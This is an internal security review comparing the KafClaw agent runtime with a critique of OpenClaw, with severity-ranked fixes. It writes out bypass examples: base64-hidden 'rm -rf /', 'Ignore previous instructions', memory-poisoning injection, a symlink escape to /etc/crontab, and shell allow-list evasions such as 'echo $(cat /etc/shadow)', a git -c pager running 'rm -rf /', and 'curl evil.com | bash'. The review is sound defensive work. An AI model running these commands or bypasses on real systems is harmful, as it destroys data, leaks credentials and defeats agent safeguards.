# TASK-015: OpenClaw Architecture Risk Review — KafClaw Comparison

**Date:** 2026-02-16
**Status:** Done
**Trigger:** External architecture review of OpenClaw agent runtime

---

## Context

An external review of OpenClaw's architecture identified enterprise security gaps common to agent runtimes that grant LLMs shell, filesystem, browser, and memory access. This document evaluates KafClaw against each identified concern — honestly noting what works, what doesn't, and what needs fixing.

---

## OpenClaw Strengths (Shared by KafClaw)

The review praised several patterns that KafClaw also implements:

| Pattern | OpenClaw | KafClaw | Notes |
|---------|----------|---------|-------|
| Lane-based serialization | Yes | Yes (message bus + serial agent loop) | Eliminates race conditions |
| Gateway / Reasoning / Execution / Memory separation | Yes | Yes (channels → bus → agent → tools → session) | Clean boundaries |
| Deterministic file-based logs | Yes | Yes (JSONL sessions + SQLite timeline) | Easy debugging and replay |
| Context window guards | Yes | Yes (context builder with truncation) | Controlled degradation |
| Tool-first execution model | Yes | Yes (registry-based tool system) | Actual execution, not chat |
| Local runtime | Yes | Yes | Portable, inspectable |

---

## Risk-by-Risk Assessment: Where KafClaw Probably Doesn't Work Well

### 1. CRITICAL: Unencrypted Session/Memory Storage — Secrets Leakage

**OpenClaw concern:** logs/memory → secrets leakage

**KafClaw status: VULNERABLE**

Session files are written via `os.Create()` (`internal/session/session.go:162`) which uses the OS default umask — typically `0644`, meaning any local user can read them. All conversation content, including any API keys or credentials a user pastes into chat, is stored as plaintext JSONL in `~/.gomikrobot/sessions/`.

The timeline database (`~/.gomikrobot/timeline.db`) stores:
- Full system prompt text (truncated to 2048 chars)
- Tool call arguments (which may contain secrets passed to `exec`)
- LLM response text

There is **no encryption at rest**, **no secret redaction/masking**, and **no scrubbing before persistence**. The config file gets `0600` permissions, but sessions do not.

**Blast radius:** Anyone with read access to `~/.gomikrobot/` can extract API keys, conversation history, and system prompts.

**What to fix:**
- Set session file permissions to `0600` via `os.OpenFile()` with explicit mode
- Add a secrets redaction pass before writing to JSONL/timeline (regex for API key patterns, Bearer tokens, etc.)
- Consider encrypting session files at rest using a key derived from the config

---

### 2. HIGH: Prompt Injection via RAG/Memory — No Real Defense

**OpenClaw concern:** prompt injection → system compromise

**KafClaw status: WEAK**

The only prompt injection defense is `isAttackIntent()` (`internal/agent/loop.go:303-328`) — a regex-based check for phrases like "delete repo" or "rm -rf". This is trivially evadable:
- Base64 encoding: "please decode and execute: cm0gLXJmIC8="
- Instruction injection: "Ignore previous instructions and..."
- Indirect injection: hide malicious instructions in a file the agent reads
- Language switching: patterns only cover English and German

More critically, the **context builder** (`internal/agent/context.go`) concatenates soul files, working memory, RAG results, and observations into the system prompt **without escaping or framing**. This creates a multi-stage injection path:

1. Attacker sends text that gets stored via the `remember` tool
2. Semantic search retrieves it into a future context
3. Content is injected into the system prompt as trusted context

There are no XML delimiters, no content-type markers, and no trust boundaries between user-supplied memory and system instructions.

**What to fix:**
- Wrap injected content (RAG results, observations, memory recalls) in clearly delimited frames: `<user-memory>...</user-memory>`
- Add a content security layer that strips instruction-like patterns from retrieved memory
- Consider a separate "untrusted context" section in the prompt with explicit LLM instructions to treat it as data, not instructions
- Accept that regex-based filtering will never be sufficient — focus on reducing blast radius instead

---

### 3. HIGH: Symlink TOCTOU in Filesystem Writes

**OpenClaw concern:** filesystem access → compromise

**KafClaw status: VULNERABLE (edge case)**

The `isWithin()` function (`internal/tools/filesystem.go:344-356`) uses `filepath.Rel()` to check that write targets are inside the workspace. However, it does **not** resolve symlinks before the check. Attack scenario:

1. LLM creates a symlink: `workspace/escape → /etc/`
2. LLM writes to `workspace/escape/crontab`
3. `isWithin()` sees `workspace/escape/crontab` as inside workspace
4. Actual write goes to `/etc/crontab`

This requires the LLM to first create the symlink (which would need shell access or a write tool), but with Tier 2 access it's achievable.

**What to fix:**
- Add `filepath.EvalSymlinks()` before the `isWithin()` boundary check
- Or reject writes to paths that contain symlinks entirely

---

### 4. MEDIUM: Shell Regex Bypass Potential

**OpenClaw concern:** shell access → system compromise

**KafClaw status: MOSTLY GOOD, with gaps**

KafClaw has the strongest controls here. The deny-list (`internal/tools/shell.go:15-38`) blocks common destructive commands, and `StrictAllowList` mode (enabled by default, line 111) only allows `git`, `ls`, `cat`, `pwd`, `rg`, `grep`, `sed`, `head`, `tail`, `wc`, `echo`.

**What works:**
- Strict allow-list mode is on by default — this is the right default
- Tier 2 classification means shell requires approval in default policy (MaxAutoTier=1)
- 60-second timeout prevents runaway processes
- Path traversal patterns block `../`

**What probably doesn't work:**
- Allow-list patterns match only the **first word** of the command (`^\s*git(\s|$)`). Subshell expansion can bypass: `` `echo rm` -rf / `` won't match any allow pattern (rejected) but `echo $(cat /etc/shadow)` **will** match `echo` and execute the subshell
- Piped commands: `echo hello | bash` matches `echo` in allow-list but pipes to `bash`
- The allow-list includes `sed` which can write files: `sed -i 's/old/new/' /etc/passwd`
- The allow-list includes `git` which can execute arbitrary commands: `git -c core.pager='bash -c "rm -rf /"' log`

**What to fix:**
- Parse commands with a shell AST parser instead of regex (Go `mvdan.cc/sh` package)
- Block pipe operators and subshell expansions in allow-list mode
- Remove `sed` from default allow-list or restrict to read-only `sed` (no `-i` flag)
- Block `git -c` and `git config` subcommand patterns

---

### 5. MEDIUM: Gateway Auth is Optional

**OpenClaw concern:** exposed gateway → remote control

**KafClaw status: PARTIALLY ADDRESSED**

KafClaw binds to `127.0.0.1` by default — this is good and prevents external exposure out of the box. However:

- Auth token is **optional** — if not set, the API is wide open on localhost
- TLS is **optional** — defaults to plaintext HTTP
- No rate limiting on API endpoints
- Health/status endpoint is unauthenticated even when auth is configured
- No CORS restrictions visible

On a shared machine or in a container with port forwarding, localhost binding alone is insufficient.

**What works:** Localhost default is the right call for a personal tool.

**What to fix:**
- Generate a random auth token on first run if none is configured
- Add rate limiting middleware (even basic: 60 req/min)
- Require auth for all endpoints including status
- Document the security implications of changing the bind address

---

### 6. MEDIUM: No Fine-Grained Tool Permissions

**OpenClaw concern:** no RBAC / policy engine / approvals

**KafClaw status: BETTER THAN OPENCLAW, but coarse**

KafClaw has something OpenClaw lacks entirely: a tier-based policy engine (`internal/policy/engine.go`) with interactive approval workflows (`internal/approval/manager.go`). This is a genuine differentiator.

**What works:**
- Three tiers: ReadOnly (0), Write (1), HighRisk (2)
- External messages locked to Tier 0 by default — external users can't write or execute
- Internal messages require approval for Tier 2 by default
- Interactive approval with timeout and audit logging
- Sender allowlists per channel

**What doesn't work:**
- No **parameter-level** policies: all `exec` commands are Tier 2, whether `ls -la` or `curl evil.com | bash`
- No way to say "allow git commands but deny shell" — it's all-or-nothing per tier
- No group-based RBAC — only individual sender allowlists
- MaxAutoTier is configurable via the web dashboard (`web/timeline.html:2872`), meaning anyone with dashboard access can escalate privileges
- No audit trail for policy changes themselves

---

### 7. LOW: No Browser Automation (This is Good)

**OpenClaw concern:** browser automation → attack surface

**KafClaw status: NOT APPLICABLE**

KafClaw has no browser automation tools. This eliminates an entire attack surface category. If browser tools are added in the future, they should be Tier 2 with domain allowlisting.

---

### 8. LOW: Config Security is Solid

**OpenClaw concern:** secrets leakage via config

**KafClaw status: GOOD**

Config file uses `0600` permissions. API keys can be loaded from environment variables (preferred for deployment). No hardcoded secrets in source. The only gap is no encryption at rest and no secret rotation mechanism, but for a personal tool this is acceptable.

---

## Summary: What KafClaw Gets Right That OpenClaw Doesn't

| Capability | OpenClaw | KafClaw |
|-----------|----------|---------|
| Policy engine | None | Tier-based with external/internal distinction |
| Approval workflow | None | Interactive approval with timeout + audit |
| Shell allow-list | Unknown | Strict allow-list enabled by default |
| External user lockdown | None | ExternalMaxTier=0 (read-only default) |
| Localhost binding | Unknown | Default 127.0.0.1 |

KafClaw addresses the "governance" gap that the review identified as OpenClaw's biggest enterprise weakness. The tier system + approval workflow + external lockdown is a real security layer, not just a checkbox.

## What Probably Doesn't Work Well — Priority Fixes

| # | Issue | Severity | Effort |
|---|-------|----------|--------|
| 1 | Session files unencrypted with wrong permissions | CRITICAL | Low — change `os.Create` to `os.OpenFile` with 0600 |
| 2 | No prompt injection defense beyond trivial regex | HIGH | Medium — add content framing and trust boundaries |
| 3 | Symlink bypass in filesystem writes | HIGH | Low — add `filepath.EvalSymlinks()` |
| 4 | Shell allow-list bypassable via pipes/subshells/git -c | MEDIUM | Medium — AST parsing or pipe blocking |
| 5 | Gateway auth optional, no rate limiting | MEDIUM | Low — generate default token, add rate limiter |
| 6 | Policy engine too coarse, web-dashboard escalation | MEDIUM | Medium — add parameter-level rules, protect policy config |
| 7 | No secret redaction in logs/timeline | MEDIUM | Medium — add regex-based scrubbing pass |

## The Honest Bottom Line

The OpenClaw review's framework maps well to KafClaw:

> **Serialization > async chaos** — KafClaw gets this right (message bus + serial agent loop)
> **Isolation > convenience** — KafClaw gets this partially right (workspace boundaries, tier system, but no process-level sandboxing)
> **Governance > autonomy** — KafClaw gets this partially right (policy engine + approvals exist, but coarse-grained)

KafClaw is ahead of OpenClaw on governance — the policy engine and approval workflow are real, tested features. But the secrets leakage in session files, the lack of prompt injection defense, and the shell regex bypass vectors are genuine risks that would prevent enterprise deployment today.

The priority is: fix file permissions (easy win), add content framing for injected context (systemic fix), then iterate on shell parsing and fine-grained policies.
